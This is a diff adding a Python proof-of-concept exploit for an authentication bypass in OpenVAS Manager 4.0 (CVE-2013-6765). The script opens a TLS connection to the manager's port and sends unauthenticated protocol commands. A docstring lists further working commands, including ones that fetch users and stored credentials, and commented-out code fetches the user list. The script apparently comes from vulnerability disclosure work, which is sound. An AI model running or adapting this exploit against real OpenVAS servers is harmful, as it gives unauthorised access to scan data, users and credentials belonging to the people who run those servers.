@@ -1,0 +1,75 @@
+#!/usr/bin/python
+
+# Exploit Title: OpenVAS Manager 4.0 Authentication Bypass Vulnerability PoC 
+# Date: 09/07/2014
+# Exploit Author: EccE
+# Vendor Homepage: http://www.openvas.org/
+# Software Link: http://wald.intevation.org/frs/?group_id=29
+# Version: OpenVAS Manager 4.0 
+# Tested on: Debian GNU/Linux testing (jessie)
+# CVE : CVE-2013-6765
+
+"""	
+	Small list of working commands
+
+get_agents 
+get_configs 
+get_alerts
+get_filters
+get_lsc_credentials 
+get_notes 
+get_nvts 
+get_targets
+get_users
+get_schedules
+
+
+More commands (~70 commands) can be found directly in the omc.c file. Not all of them are working though. 
+As designed in OMP protocol, commands must be sent this way : <COMMAND/>
+
+"""
+
+import socket, ssl
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Require a certificate from the server. We used a self-signed certificate
+# so here cacerts.pem must be the server certificate itself.
+ssl_sock = ssl.wrap_socket(s,
+                           ca_certs="/var/lib/openvas/CA/cacert.pem", 
+                           cert_reqs=ssl.CERT_REQUIRED)
+
+# OpenVAS Manager listen by default on localhost tcp/9390
+ssl_sock.connect(('localhost', 9390))
+
+
+print "#################################################################"
+print "# Proof of Concept - OpenVAS Manager 4.0 Authentication Bypass  #"
+print "#################################################################"
+print "\n"
+
+print "--> Retrieving version...(exploiting the bug !)\n"
+ssl_sock.write("<get_version/>")
+data = ssl_sock.read()
+print data
+print "\n"
+
+
+print "--> Retrieving slaves...\n"
+ssl_sock.write("<get_slaves/>")
+tasks = ssl_sock.read()
+print tasks
+print "\n"
+
+"""
+print "--> Creating note...\n"
+ssl_sock.write("<create_note/>")
+note = ssl_sock.read()
+print note 
+
+print "--> Retrieving users list...\n"
+ssl_sock.write("<get_users/>")
+users_list = ssl_sock.read()
+print users_list
+"""
+ssl_sock.close()
